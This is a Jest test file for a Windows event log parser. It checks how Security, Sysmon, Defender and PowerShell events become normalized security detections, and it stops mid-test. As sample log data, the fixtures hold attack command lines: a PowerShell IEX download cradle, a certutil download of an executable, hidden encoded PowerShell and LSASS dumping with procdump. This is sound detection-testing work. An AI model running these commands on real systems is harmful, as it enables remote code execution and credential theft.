import { describe, expect, test } from "@jest/globals";
import NormalizedSecurityEvent from "../../../../Types/SecurityEvent/NormalizedSecurityEvent";
import SecurityLogFormat, {
  SECURITY_LOG_FORMAT_ATTRIBUTE,
} from "../../../../Types/SecurityEvent/SecurityLogFormat";
import {
  DETECTION_RULE_LIBRARY,
  DetectionRuleLibraryEntry,
} from "../../../../Types/SecurityEvent/DetectionRuleLibrary";
import SigmaRule from "../../../../Types/SecurityEvent/SigmaRule";
import SecurityLogParser, {
  matchesSecurityLogPrefilter,
} from "../../../../Utils/SecurityEvent/LogParsers/SecurityLogParser";
import WindowsEventLogParser, {
  KEPT_LOGON_TYPES,
  NOISY_LOGON_TYPES,
  PRIVILEGED_WINDOWS_GROUPS,
  WINDOWS_FAILURE_REASONS,
  WINDOWS_PREFILTER_GROUPS,
  WINDOWS_PROVIDERS,
  commonNameOf,
  getWindowsEventIds,
  logonTypeMarkers,
} from "../../../../Utils/SecurityEvent/LogParsers/WindowsEventLogParser";
import SigmaRuleParser from "../../../../Utils/SecurityEvent/Sigma/SigmaRuleParser";
import { FastestRun, fastestRun } from "../../../Helpers/FastestRun";
import { logLine } from "./LogParserFixtures";
import { sigmaRuleMatchesEvent } from "./SigmaTestMatcher";
import {
  NAMED_SHAPES,
  WindowsEventSpec,
  WindowsShape,
  collectorOtlpBody,
  failedSignIn,
  fluentBitBody,
  processCreated,
  successfulSignIn,
  windowsEvent,
  xmlBody,
} from "./WindowsEventFixtures";

/*
 * Contract under test - Windows events in a project's logs become security
 * events (WindowsEventLogParser), whichever way they were collected.
 *
 * The events are Windows' own, field for field (the Security log's 4625
 * has 21 fields, in this order); the machines, accounts and addresses are
 * made up (RFC 5737 documentation addresses).
 */

function parse(body: string): Array<NormalizedSecurityEvent> {
  return WindowsEventLogParser.parse(logLine(body, { "host.name": "win-01" }));
}

function only(body: string): NormalizedSecurityEvent {
  const events: Array<NormalizedSecurityEvent> = parse(body);

  expect(events).toHaveLength(1);

  return events[0]!;
}

function viaCollector(spec: WindowsEventSpec): NormalizedSecurityEvent {
  return only(collectorOtlpBody(spec));
}

const SECURITY: string = WINDOWS_PROVIDERS.securityAuditing;
const SYSMON: string = WINDOWS_PROVIDERS.sysmon;
const DEFENDER: string = WINDOWS_PROVIDERS.defender;

describe("WindowsEventLogParser - every way a Windows event arrives", () => {
  test.each(NAMED_SHAPES)(
    "a failed sign-in sent as %s becomes the same security event",
    (_shape: WindowsShape, render: (spec: WindowsEventSpec) => string) => {
      const event: NormalizedSecurityEvent = only(render(failedSignIn()));

      expect({
        className: event.className,
        classUid: event.classUid,
        categoryName: event.categoryName,
        activityName: event.activityName,
        statusName: event.statusName,
        severityName: event.severityName,
        vendorName: event.vendorName,
        productName: event.productName,
        principalUser: event.principalUser,
        principalIp: event.principalIp,
        principalHost: event.principalHost,
        targetHost: event.targetHost,
        message: event.message,
      }).toEqual({
        className: "Authentication",
        classUid: 3002,
        categoryName: "Identity & Access Management",
        activityName: "Logon",
        statusName: "Failure",
        severityName: "Low",
        vendorName: "Microsoft",
        productName: "Windows",
        principalUser: "alice",
        principalIp: "203.0.113.7",
        principalHost: "WKS-07",
        targetHost: "WIN-01.corp.example",
        message:
          "Failed sign-in for CORP\\alice to WIN-01.corp.example over the network from 203.0.113.7: wrong password",
      });
      expect(event.attributes[SECURITY_LOG_FORMAT_ATTRIBUTE]).toBe(
        SecurityLogFormat.WindowsEvents,
      );
      expect(event.attributes["EventID"]).toBe("4625");
      expect(event.attributes["Provider_Name"]).toBe(SECURITY);
      expect(event.attributes["Channel"]).toBe("Security");
      expect(event.attributes["TargetUserName"]).toBe("alice");
      expect(event.attributes["LogonType"]).toBe("3");
      expect(event.attributes["SubStatus"]).toBe("0xc000006a");
    },
  );

  test("the collector's event time is the event's, to the millisecond", () => {
    expect(viaCollector(failedSignIn()).time.toISOString()).toBe(
      "2026-10-30T10:00:00.123Z",
    );
    expect(only(xmlBody(failedSignIn())).time.toISOString()).toBe(
      "2026-10-30T10:00:00.123Z",
    );
  });

  test("a record with the same computer, channel and record number has one id whatever its shape", () => {
    const ids: Set<string> = new Set(
      NAMED_SHAPES.map(
        ([, render]: [WindowsShape, (spec: WindowsEventSpec) => string]) => {
          return only(render(failedSignIn())).eventUid;
        },
      ),
    );

    expect([...ids]).toEqual(["windows:WIN-01.corp.example:Security:81542"]);
  });

  test("Fluent Bit's winevtlog names the core events' fields by their position", () => {
    const failed: NormalizedSecurityEvent = only(fluentBitBody(failedSignIn()));

    expect(failed.principalUser).toBe("alice");
    expect(failed.principalIp).toBe("203.0.113.7");
    expect(failed.attributes["SubStatus"]).toBe("0xc000006a");

    const launched: NormalizedSecurityEvent = only(
      fluentBitBody(processCreated()),
    );

    expect(launched.processCommandLine).toBe(
      "powershell.exe -nop -w hidden -enc SQBFAFgA",
    );
    expect(launched.parentProcessName).toBe("cmd.exe");

    const rdp: NormalizedSecurityEvent = only(
      fluentBitBody(successfulSignIn()),
    );

    expect(rdp.message).toContain("over Remote Desktop");
  });

  test("an event of another kind of Fluent Bit record keeps its fields as param1, param2...", () => {
    const event: NormalizedSecurityEvent = only(
      fluentBitBody(
        windowsEvent(4720, SECURITY, "Security", [
          ["TargetUserName", "mallory"],
          ["TargetDomainName", "CORP"],
        ]),
      ),
    );

    expect(event.className).toBe("Account Change");
    expect(event.attributes["param1"]).toBe("mallory");
  });

  test("the log's host names the computer when the event does not", () => {
    const spec: WindowsEventSpec = { ...failedSignIn(), computer: "" };
    const event: NormalizedSecurityEvent = WindowsEventLogParser.parse(
      logLine(collectorOtlpBody(spec), { "host.name": "win-07" }),
    )[0]!;

    expect(event.targetHost).toBe("win-07");
  });
});

describe("WindowsEventLogParser - sign-ins", () => {
  test.each(Object.keys(KEPT_LOGON_TYPES))(
    "a successful logon of type %s, made by a person, is an event",
    (logonType: string) => {
      const event: NormalizedSecurityEvent = viaCollector(
        successfulSignIn({ LogonType: logonType }),
      );

      expect(event.statusName).toBe("Success");
      expect(event.severityName).toBe("Informational");
      expect(event.principalUser).toBe("alice");
      expect(event.message).toBe(
        `CORP\\alice signed in to WIN-01.corp.example ${KEPT_LOGON_TYPES[logonType]} from 198.51.100.23`,
      );
    },
  );

  test.each([...NOISY_LOGON_TYPES, "0", ""])(
    "a successful logon of type %s - the machine at work - stays a log",
    (logonType: string) => {
      expect(parse(collectorOtlpBody(successfulSignIn({ LogonType: logonType })))).toEqual(
        [],
      );
    },
  );

  test.each([
    "WIN-01$",
    "SYSTEM",
    "LOCAL SERVICE",
    "NETWORK SERVICE",
    "ANONYMOUS LOGON",
    "DWM-1",
    "UMFD-0",
    "-",
  ])("a logon by %s, an account Windows runs as, stays a log", (user: string) => {
    expect(
      parse(collectorOtlpBody(successfulSignIn({ TargetUserName: user }))),
    ).toEqual([]);
  });

  test.each(["127.0.0.1", "::1", "-", "0.0.0.0", ""])(
    "a sign-in from %s names no address",
    (address: string) => {
      const event: NormalizedSecurityEvent = viaCollector(
        failedSignIn({ IpAddress: address }),
      );

      expect(event.principalIp).toBe("");
      expect(event.message).not.toContain(" from ");
    },
  );

  test("an IPv6 address is kept", () => {
    expect(viaCollector(failedSignIn({ IpAddress: "2001:db8::7" })).principalIp).toBe(
      "2001:db8::7",
    );
  });

  test.each(Object.entries(WINDOWS_FAILURE_REASONS).filter(([code]) => {
    return code.startsWith("0xc");
  }))("a failure with status %s says why: %s", (code: string, reason: string) => {
    expect(
      viaCollector(failedSignIn({ SubStatus: code })).message.endsWith(
        `: ${reason}`,
      ),
    ).toBe(true);
  });

  test("a failure's Status says why when its SubStatus does not", () => {
    expect(
      viaCollector(
        failedSignIn({ Status: "0xc0000234", SubStatus: "0x0" }),
      ).message.endsWith(": account locked out"),
    ).toBe(true);
  });

  test("a failure Windows gives no known reason for says none", () => {
    expect(
      viaCollector(failedSignIn({ Status: "0x1", SubStatus: "0x2" })).message,
    ).toBe(
      "Failed sign-in for CORP\\alice to WIN-01.corp.example over the network from 203.0.113.7",
    );
  });

  test("a sign-in with explicit credentials names who used them, as whom and where", () => {
    const event: NormalizedSecurityEvent = viaCollector(
      windowsEvent(4648, SECURITY, "Security", [
        ["SubjectUserName", "alice"],
        ["SubjectDomainName", "CORP"],
        ["TargetUserName", "admin"],
        ["TargetDomainName", "CORP"],
        ["TargetServerName", "FILE-02"],
        ["ProcessName", "C:\\Windows\\System32\\runas.exe"],
        ["IpAddress", "-"],
      ]),
    );

    expect(event.principalUser).toBe("alice");
    expect(event.targetUser).toBe("admin");
    expect(event.targetHost).toBe("FILE-02");
    expect(event.message).toBe(
      "alice signed in as CORP\\admin on FILE-02 with explicit credentials",
    );
  });

  test("explicit credentials a machine account used stay a log", () => {
    expect(
      parse(
        collectorOtlpBody(
          windowsEvent(4648, SECURITY, "Security", [
            ["SubjectUserName", "WIN-01$"],
            ["TargetUserName", "svc-backup"],
          ]),
        ),
      ),
    ).toEqual([]);
  });

  test("a failed Kerberos pre-authentication reads the IPv4 address Windows writes as IPv6", () => {
    const event: NormalizedSecurityEvent = viaCollector(
      windowsEvent(4771, SECURITY, "Security", [
        ["TargetUserName", "alice"],
        ["TargetSid", "S-1-5-21-1-2-3-1104"],
        ["ServiceName", "krbtgt/CORP.EXAMPLE"],
        ["TicketOptions", "0x40810010"],
        ["Status", "0x18"],
        ["PreAuthType", "2"],
        ["IpAddress", "::ffff:198.51.100.40"],
        ["IpPort", "53122"],
      ]),
    );

    expect(event.statusName).toBe("Failure");
    expect(event.principalIp).toBe("198.51.100.40");
    expect(event.message).toBe(
      "Kerberos pre-authentication failed for alice from 198.51.100.40: wrong password",
    );
  });
});

describe("WindowsEventLogParser - processes", () => {
  test("a process started is a launch with its command line and its parent", () => {
    const event: NormalizedSecurityEvent = viaCollector(processCreated());

    expect({
      className: event.className,
      activityName: event.activityName,
      principalUser: event.principalUser,
      principalHost: event.principalHost,
      principalProcess: event.principalProcess,
      processName: event.processName,
      processPath: event.processPath,
      processCommandLine: event.processCommandLine,
      parentProcessName: event.parentProcessName,
      parentProcessPath: event.parentProcessPath,
      message: event.message,
    }).toEqual({
      className: "Process Activity",
      activityName: "Launch",
      principalUser: "alice",
      principalHost: "WIN-01.corp.example",
      principalProcess: "cmd.exe",
      processName: "powershell.exe",
      processPath:
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      processCommandLine: "powershell.exe -nop -w hidden -enc SQBFAFgA",
      parentProcessName: "cmd.exe",
      parentProcessPath: "C:\\Windows\\System32\\cmd.exe",
      message: "powershell.exe started on WIN-01.corp.example as alice",
    });
  });

  test("the account a process runs as is named before the one that started it", () => {
    expect(
      viaCollector(processCreated({ TargetUserName: "svc-web" })).principalUser,
    ).toBe("svc-web");
  });
});

describe("WindowsEventLogParser - accounts and groups", () => {
  test.each([
    [4720, "Create", "created", "Low"],
    [4722, "Enable", "enabled", "Informational"],
    [4723, "Password Change", "had its password changed", "Informational"],
    [4724, "Password Reset", "had its password reset", "Low"],
    [4725, "Disable", "disabled", "Low"],
    [4726, "Delete", "deleted", "Low"],
    [4767, "Unlock", "unlocked", "Informational"],
    [4781, "Rename", "renamed", "Low"],
  ])(
    "account event %s is an Account Change: %s",
    (eventId: number, activity: string, verb: string, severity: string) => {
      const event: NormalizedSecurityEvent = viaCollector(
        windowsEvent(eventId, SECURITY, "Security", [
          ["TargetUserName", "mallory"],
          ["TargetDomainName", "CORP"],
          ["SubjectUserName", "alice"],
        ]),
      );

      expect(event.className).toBe("Account Change");
      expect(event.activityName).toBe(activity);
      expect(event.severityName).toBe(severity);
      expect(event.principalUser).toBe("alice");
      expect(event.targetUser).toBe("mallory");
      expect(event.message).toBe(
        `Account CORP\\mallory ${verb} on WIN-01.corp.example by alice`,
      );
    },
  );

  test("an account created is tagged with ATT&CK's Create Account", () => {
    const event: NormalizedSecurityEvent = viaCollector(
      windowsEvent(4720, SECURITY, "Security", [["TargetUserName", "mallory"]]),
    );

    expect(event.mitreTechniques).toEqual(["T1136"]);
    expect(event.mitreTactics).toEqual(["TA0003"]);
  });

  test("a lockout names the computer the failed sign-ins came from", () => {
    const event: NormalizedSecurityEvent = viaCollector(
      windowsEvent(4740, SECURITY, "Security", [
        ["TargetUserName", "alice"],
        ["TargetDomainName", "WKS-07"],
        ["SubjectUserName", "DC01$"],
      ]),
    );

    expect(event.activityName).toBe("Lock");
    expect(event.targetUser).toBe("alice");
    expect(event.principalHost).toBe("WKS-07");
    expect(event.principalUser).toBe("");
    expect(event.message).toBe(
      "Account alice locked out on WIN-01.corp.example after failed sign-ins from WKS-07",
    );
  });

  test.each(PRIVILEGED_WINDOWS_GROUPS)(
    "a member added to %s is a Medium group change",
    (group: string) => {
      const event: NormalizedSecurityEvent = viaCollector(
        windowsEvent(4732, SECURITY, "Security", [
          ["MemberName", "CN=Mallory Doe,OU=Staff,DC=corp,DC=example"],
          ["MemberSid", "S-1-5-21-1-2-3-1199"],
          ["TargetUserName", group.toUpperCase()],
          ["TargetDomainName", "BUILTIN"],
          ["SubjectUserName", "alice"],
        ]),
      );

      expect(event.className).toBe("Group Management");
      expect(event.activityName).toBe("Add User");
      expect(event.severityName).toBe("Medium");
      expect(event.targetUser).toBe("Mallory Doe");
      expect(event.targetResource).toBe(`BUILTIN\\${group.toUpperCase()}`);
      expect(event.mitreTechniques).toEqual(["T1098"]);
    },
  );

  test("a member added to another group is a Low change, and a local group's member is its SID", () => {
    const event: NormalizedSecurityEvent = viaCollector(
      windowsEvent(4728, SECURITY, "Security", [
        ["MemberName", "-"],
        ["MemberSid", "S-1-5-21-1-2-3-1199"],
        ["TargetUserName", "Finance"],
        ["TargetDomainName", "CORP"],
        ["SubjectUserName", "alice"],
      ]),
    );

    expect(event.severityName).toBe("Low");
    expect(event.targetUser).toBe("S-1-5-21-1-2-3-1199");
    expect(event.message).toBe(
      "S-1-5-21-1-2-3-1199 added to Finance on WIN-01.corp.example by alice",
    );
  });

  test.each([4729, 4733, 4757])(
    "a member removed (%s) is an Informational group change",
    (eventId: number) => {
      const event: NormalizedSecurityEvent = viaCollector(
        windowsEvent(eventId, SECURITY, "Security", [
          ["MemberName", "CN=Bob,DC=corp,DC=example"],
          ["TargetUserName", "Domain Admins"],
        ]),
      );

      expect(event.activityName).toBe("Remove User");
      expect(event.severityName).toBe("Informational");
      expect(event.mitreTechniques).toEqual([]);
    },
  );

  test("commonNameOf reads a distinguished name's first name, escapes and all", () => {
    expect(commonNameOf("CN=Bob Smith,OU=Staff,DC=corp,DC=example")).toBe(
      "Bob Smith",
    );
    expect(commonNameOf("CN=Smith\\, Bob,OU=Staff,DC=corp")).toBe("Smith, Bob");
    expect(commonNameOf("S-1-5-21-1")).toBe("S-1-5-21-1");
    expect(commonNameOf("")).toBe("");
  });
});

describe("WindowsEventLogParser - services, tasks, policy and logs", () => {
  test("a service installed (Security 4697) names it and what it runs", () => {
    const event: NormalizedSecurityEvent = viaCollector(
      windowsEvent(4697, SECURITY, "Security", [
        ["SubjectUserName", "alice"],
        ["ServiceName", "PSEXESVC"],
        ["ServiceFileName", "%SystemRoot%\\PSEXESVC.exe"],
        ["ServiceType", "0x10"],
        ["ServiceStartType", "3"],
      ]),
    );

    expect(event.className).toBe("Application Lifecycle");
    expect(event.activityName).toBe("Install");
    expect(event.targetResource).toBe("PSEXESVC");
    expect(event.processCommandLine).toBe("%SystemRoot%\\PSEXESVC.exe");
    expect(event.mitreTechniques).toEqual(["T1543.003"]);
    expect(event.message).toBe(
      'Service "PSEXESVC" installed on WIN-01.corp.example: %SystemRoot%\\PSEXESVC.exe',
    );
  });

  test("a service installed (System 7045) whose image is a command is read as one", () => {
    const event: NormalizedSecurityEvent = viaCollector(
      windowsEvent(
        7045,
        WINDOWS_PROVIDERS.serviceControlManager,
        "System",
        [
          ["ServiceName", "updater"],
          [
            "ImagePath",
            "%COMSPEC% /b /c start /b /min powershell -nop -w hidden -enc SQBFAFgA",
          ],
          ["ServiceType", "user mode service"],
          ["StartType", "demand start"],
          ["AccountName", "LocalSystem"],
        ],
      ),
    );

    expect(event.activityName).toBe("Install");
    expect(event.attributes["ImagePath"]).toContain("-enc SQBFAFgA");
    expect(event.processCommandLine).toContain("-enc SQBFAFgA");
  });

  test("a service set to disabled (7040) is an event; any other start type is not", () => {
    const disabled: NormalizedSecurityEvent = viaCollector(
      windowsEvent(7040, WINDOWS_PROVIDERS.serviceControlManager, "System", [
        ["param1", "Windows Defender Antivirus Service"],
        ["param2", "auto start"],
        ["param3", "disabled"],
        ["param4", "WinDefend"],
      ]),
    );

    expect(disabled.activityName).toBe("Disable");
    expect(disabled.targetResource).toBe("Windows Defender Antivirus Service");
    expect(
      parse(
        collectorOtlpBody(
          windowsEvent(7040, WINDOWS_PROVIDERS.serviceControlManager, "System", [
            ["param1", "Background Intelligent Transfer Service"],
            ["param2", "demand start"],
            ["param3", "auto start"],
          ]),
        ),
      ),
    ).toEqual([]);
  });

  test.each([
    [4698, "Create", "created", "Low"],
    [4699, "Delete", "deleted", "Informational"],
    [4700, "Enable", "enabled", "Informational"],
    [4701, "Disable", "disabled", "Informational"],
    [4702, "Update", "updated", "Informational"],
  ])(
    "scheduled task event %s is a %s",
    (eventId: number, activity: string, verb: string, severity: string) => {
      const event: NormalizedSecurityEvent = viaCollector(
        windowsEvent(eventId, SECURITY, "Security", [
          ["SubjectUserName", "alice"],
          ["TaskName", "\\Microsoft\\Windows\\Updater"],
          ["TaskContent", "<Task><Actions><Exec><Command>c:\\x.exe</Command></Exec></Actions></Task>"],
        ]),
      );

      expect(event.className).toBe("Scheduled Job Activity");
      expect(event.activityName).toBe(activity);
      expect(event.severityName).toBe(severity);
      expect(event.targetResource).toBe("\\Microsoft\\Windows\\Updater");
      expect(event.message).toBe(
        `Scheduled task "\\Microsoft\\Windows\\Updater" ${verb} on WIN-01.corp.example by alice`,
      );
    },
  );

  test("the audit policy changed is a Medium Event Log Activity", () => {
    const event: NormalizedSecurityEvent = viaCollector(
      windowsEvent(4719, SECURITY, "Security", [
        ["SubjectUserName", "alice"],
        ["CategoryId", "%%8274"],
        ["SubcategoryGuid", "{0cce922b-69ae-11d9-bed3-505054503030}"],
        ["AuditPolicyChanges", "%%8448"],
      ]),
    );

    expect(event.className).toBe("Event Log Activity");
    expect(event.severityName).toBe("Medium");
    expect(event.mitreTechniques).toEqual(["T1562.002"]);
  });

  const AUDIT_LOG_CLEARED: WindowsEventSpec = windowsEvent(
    1102,
    WINDOWS_PROVIDERS.eventLog,
    "Security",
    [],
    {
      userData: {
        name: "LogFileCleared",
        fields: [
          ["SubjectUserSid", "S-1-5-21-1-2-3-1104"],
          ["SubjectUserName", "alice"],
          ["SubjectDomainName", "CORP"],
          ["SubjectLogonId", "0x8dcdc"],
        ],
      },
    },
  );

  test.each(NAMED_SHAPES)(
    "the audit log cleared, sent as %s, names who cleared it from its UserData",
    (_shape: WindowsShape, render: (spec: WindowsEventSpec) => string) => {
      const event: NormalizedSecurityEvent = only(render(AUDIT_LOG_CLEARED));

      expect(event.className).toBe("Event Log Activity");
      expect(event.activityName).toBe("Clear");
      expect(event.severityName).toBe("High");
      expect(event.principalUser).toBe("alice");
      expect(event.mitreTechniques).toEqual(["T1070.001"]);
      expect(event.message).toBe(
        "The Security log was cleared on WIN-01.corp.example by CORP\\alice",
      );
    },
  );

  test("the System log cleared (104) is read as well", () => {
    const event: NormalizedSecurityEvent = viaCollector(
      windowsEvent(104, WINDOWS_PROVIDERS.eventLog, "System", [], {
        userData: {
          name: "LogFileCleared",
          fields: [
            ["SubjectUserName", "alice"],
            ["Channel", "System"],
          ],
        },
      }),
    );

    expect(event.activityName).toBe("Clear");
    expect(event.targetResource).toBe("System");
  });
});

describe("WindowsEventLogParser - Sysmon", () => {
  test("a process created (1) carries its command line, its parent's and its user", () => {
    const event: NormalizedSecurityEvent = viaCollector(
      windowsEvent(1, SYSMON, "Microsoft-Windows-Sysmon/Operational", [
        ["RuleName", "-"],
        ["UtcTime", "2026-10-30 10:00:00.123"],
        ["Image", "C:\\Windows\\System32\\certutil.exe"],
        [
          "CommandLine",
          "certutil.exe -urlcache -split -f http://198.51.100.9/a.exe a.exe",
        ],
        ["User", "CORP\\alice"],
        ["ParentImage", "C:\\Windows\\System32\\cmd.exe"],
        ["ParentCommandLine", "cmd.exe /c run.bat"],
        ["Hashes", "SHA256=00AA"],
      ]),
    );

    expect(event.className).toBe("Process Activity");
    expect(event.principalUser).toBe("CORP\\alice");
    expect(event.processName).toBe("certutil.exe");
    expect(event.parentProcessCommandLine).toBe("cmd.exe /c run.bat");
    expect(event.principalProcess).toBe("cmd.exe");
    expect(event.attributes["Hashes"]).toBe("SHA256=00AA");
  });

  test("a network connection (3) names both ends", () => {
    const event: NormalizedSecurityEvent = viaCollector(
      windowsEvent(3, SYSMON, "Microsoft-Windows-Sysmon/Operational", [
        ["Image", "C:\\Users\\alice\\AppData\\Local\\Temp\\x.exe"],
        ["User", "CORP\\alice"],
        ["Protocol", "tcp"],
        ["SourceIp", "192.0.2.10"],
        ["SourcePort", "50100"],
        ["DestinationIp", "203.0.113.50"],
        ["DestinationHostname", "c2.example"],
        ["DestinationPort", "443"],
      ]),
    );

    expect(event.className).toBe("Network Activity");
    expect(event.principalIp).toBe("192.0.2.10");
    expect(event.targetIp).toBe("203.0.113.50");
    expect(event.targetPort).toBe(443);
    expect(event.targetHost).toBe("c2.example");
    expect(event.processName).toBe("x.exe");
  });

  test("LSASS opened by another process (10) is Medium; any other process Informational", () => {
    const lsass: NormalizedSecurityEvent = viaCollector(
      windowsEvent(10, SYSMON, "Microsoft-Windows-Sysmon/Operational", [
        ["SourceImage", "C:\\Users\\alice\\procdump.exe"],
        ["TargetImage", "C:\\Windows\\system32\\lsass.exe"],
        ["GrantedAccess", "0x1fffff"],
        ["SourceUser", "CORP\\alice"],
      ]),
    );

    expect(lsass.severityName).toBe("Medium");
    expect(lsass.activityName).toBe("Open");
    expect(lsass.processName).toBe("lsass.exe");
    expect(lsass.principalProcess).toBe("procdump.exe");
    expect(lsass.principalUser).toBe("CORP\\alice");
    expect(lsass.attributes["GrantedAccess"]).toBe("0x1fffff");

    expect(
      viaCollector(
        windowsEvent(10, SYSMON, "Microsoft-Windows-Sysmon/Operational", [
          ["SourceImage", "C:\\x\\a.exe"],
          ["TargetImage", "C:\\x\\b.exe"],
        ]),
      ).severityName,
    ).toBe("Informational");
  });

  test.each([
    [2, "File System Activity", "Update"],
    [6, "Kernel Extension Activity", "Load"],
    [7, "Module Activity", "Load"],
    [8, "Process Activity", "Inject"],
    [9, "File System Activity", "Read"],
    [11, "File System Activity", "Create"],
    [13, "Registry Value Activity", "Set"],
    [14, "Registry Key Activity", "Rename"],
    [15, "File System Activity", "Create"],
    [17, "Pipe Activity", "Create"],
    [18, "Pipe Activity", "Connect"],
    [19, "WMI Activity", "Created"],
    [22, "DNS Activity", "Query"],
    [23, "File System Activity", "Delete"],
    [24, "Clipboard Activity", "Update"],
    [25, "Process Activity", "Tamper"],
    [26, "File System Activity", "Delete"],
    [27, "File System Activity", "Create"],
    [29, "File System Activity", "Create"],
  ])(
    "Sysmon event %s is a %s (%s)",
    (eventId: number, className: string, activity: string) => {
      const event: NormalizedSecurityEvent = viaCollector(
        windowsEvent(eventId, SYSMON, "Microsoft-Windows-Sysmon/Operational", [
          ["Image", "C:\\x\\a.exe"],
          ["TargetFilename", "C:\\x\\b.dll"],
          ["TargetObject", "HKLM\\Software\\x"],
          ["QueryName", "c2.example"],
          ["PipeName", "\\msagent_12"],
          ["ImageLoaded", "C:\\x\\b.sys"],
          ["Operation", "Created"],
        ]),
      );

      expect(event.className).toBe(className);
      expect(event.activityName).toBe(activity);
    },
  );

  test("a registry key (12) is created or deleted as its EventType says", () => {
    const created: NormalizedSecurityEvent = viaCollector(
      windowsEvent(12, SYSMON, "Microsoft-Windows-Sysmon/Operational", [
        ["EventType", "CreateKey"],
        ["TargetObject", "HKLM\\Software\\x"],
      ]),
    );
    const deleted: NormalizedSecurityEvent = viaCollector(
      windowsEvent(12, SYSMON, "Microsoft-Windows-Sysmon/Operational", [
        ["EventType", "DeleteKey"],
        ["TargetObject", "HKLM\\Software\\x"],
      ]),
    );

    expect([created.activityName, deleted.activityName]).toEqual([
      "Create",
      "Delete",
    ]);
  });

  test("a DNS query names what was looked up as what it touched", () => {
    const event: NormalizedSecurityEvent = viaCollector(
      windowsEvent(22, SYSMON, "Microsoft-Windows-Sysmon/Operational", [
        ["Image", "C:\\x\\a.exe"],
        ["QueryName", "c2.example"],
      ]),
    );

    expect(event.targetResource).toBe("c2.example");
  });

  test("a process ending (5) and Sysmon's errors (255) stay logs", () => {
    for (const eventId of [5, 255]) {
      expect(
        parse(
          collectorOtlpBody(
            windowsEvent(eventId, SYSMON, "Microsoft-Windows-Sysmon/Operational", [
              ["Image", "C:\\x\\a.exe"],
            ]),
          ),
        ),
      ).toEqual([]);
    }
  });
});

describe("WindowsEventLogParser - Microsoft Defender", () => {
  const detection: (
    eventId: number,
    severityName?: string,
  ) => WindowsEventSpec = (
    eventId: number,
    severityName: string = "Severe",
  ): WindowsEventSpec => {
    return windowsEvent(
      eventId,
      DEFENDER,
      "Microsoft-Windows-Windows Defender/Operational",
      [
        ["Threat Name", "Trojan:Win32/Wacatac.B!ml"],
        ["Severity Name", severityName],
        ["Category Name", "Trojan"],
        ["Path", "file:_C:\\Users\\alice\\Downloads\\invoice.exe"],
        ["Detection User", "CORP\\alice"],
        ["Process Name", "C:\\Windows\\explorer.exe"],
        ["Action Name", "Quarantine"],
      ],
    );
  };

  test.each([
    ["Severe", "Critical"],
    ["High", "High"],
    ["Moderate", "Medium"],
    ["Low", "Low"],
    ["", "High"],
  ])(
    "malware found (1116) at Defender's %s is %s",
    (defenderSeverity: string, severity: string) => {
      const event: NormalizedSecurityEvent = viaCollector(
        detection(1116, defenderSeverity),
      );

      expect(event.className).toBe("Detection Finding");
      expect(event.severityName).toBe(severity);
      expect(event.ruleName).toBe("Trojan:Win32/Wacatac.B!ml");
      expect(event.principalUser).toBe("CORP\\alice");
      expect(event.targetResource).toBe(
        "C:\\Users\\alice\\Downloads\\invoice.exe",
      );
      expect(event.message).toBe(
        "Microsoft Defender found Trojan:Win32/Wacatac.B!ml on WIN-01.corp.example in C:\\Users\\alice\\Downloads\\invoice.exe",
      );
    },
  );

  test("an action taken (1117) is Medium and remediated; an action failed (1118) Critical", () => {
    const acted: NormalizedSecurityEvent = viaCollector(detection(1117));
    const failed: NormalizedSecurityEvent = viaCollector(detection(1118));

    expect([acted.severityName, acted.statusName]).toEqual([
      "Medium",
      "Remediated",
    ]);
    expect([failed.severityName, failed.statusName]).toEqual([
      "Critical",
      "Failure",
    ]);
  });

  test.each([
    [5001, "real-time protection turned off"],
    [5010, "scanning for spyware turned off"],
    [5012, "scanning for viruses turned off"],
  ])("protection turned off (%s) is a High finding", (eventId: number, what: string) => {
    const event: NormalizedSecurityEvent = viaCollector(
      windowsEvent(eventId, DEFENDER, "Microsoft-Windows-Windows Defender/Operational", []),
    );

    expect(event.severityName).toBe("High");
    expect(event.message).toBe(`Microsoft Defender ${what} on WIN-01.corp.example`);
    expect(event.mitreTechniques).toEqual(["T1562.001"]);
  });

  test("its configuration changed (5007) is a Medium finding naming the change", () => {
    const event: NormalizedSecurityEvent = viaCollector(
      windowsEvent(5007, DEFENDER, "Microsoft-Windows-Windows Defender/Operational", [
        ["Old Value", ""],
        ["New Value", "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Temp = 0x0"],
      ]),
    );

    expect(event.severityName).toBe("Medium");
    expect(event.message).toContain("Exclusions\\Paths\\C:\\Temp");
  });

  test("attack surface reduction blocking (1121) is Medium; auditing (1122) Low", () => {
    const blocked: NormalizedSecurityEvent = viaCollector(
      windowsEvent(1121, DEFENDER, "Microsoft-Windows-Windows Defender/Operational", [
        ["Process Name", "C:\\Program Files\\Microsoft Office\\WINWORD.EXE"],
        ["Path", "C:\\Users\\alice\\AppData\\Local\\Temp\\a.exe"],
      ]),
    );
    const audited: NormalizedSecurityEvent = viaCollector(
      windowsEvent(1122, DEFENDER, "Microsoft-Windows-Windows Defender/Operational", [
        ["Process Name", "C:\\x\\WINWORD.EXE"],
      ]),
    );

    expect([blocked.severityName, blocked.statusName]).toEqual(["Medium", "Blocked"]);
    expect(blocked.message).toBe(
      "Microsoft Defender blocked WINWORD.EXE on WIN-01.corp.example: C:\\Users\\alice\\AppData\\Local\\Temp\\a.exe",
    );
    expect(audited.severityName).toBe("Low");
  });
});

describe("WindowsEventLogParser - PowerShell", () => {
  test("a script block PowerShell flagged as suspicious (a warning) is a Script Activity", () => {
    const event: NormalizedSecurityEvent = viaCollector(
      windowsEvent(4104, WINDOWS_PROVIDERS.powerShell, "Microsoft-Windows-PowerShell/Operational", [
        ["MessageNumber", "1"],
        ["MessageTotal", "1"],
        ["ScriptBlockText", "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.9/a.ps1')"],
        ["ScriptBlockId", "{00000000-0000-0000-0000-000000000000}"],
        ["Path", "C:\\Users\\alice\\run.ps1"],
      ], { level: "Warning" }),
    );

    expect(event.className).toBe("Script Activity");
    expect(event.severityName).toBe("Medium");
    expect(event.attributes["ScriptBlockText"]).toContain("DownloadString");
  });

  test("the same block logged at another level stays a log", () => {
    for (const level of ["Verbose", "Information", "5"]) {
      expect(
        parse(
          collectorOtlpBody(
            windowsEvent(4104, WINDOWS_PROVIDERS.powerShell, "Microsoft-Windows-PowerShell/Operational", [
              ["ScriptBlockText", "Get-Date"],
            ], { level }),
          ),
        ),
      ).toEqual([]);
    }
  });

  test("the XML's numeric level 3 is a warning too", () => {
    const xml: string = xmlBody(
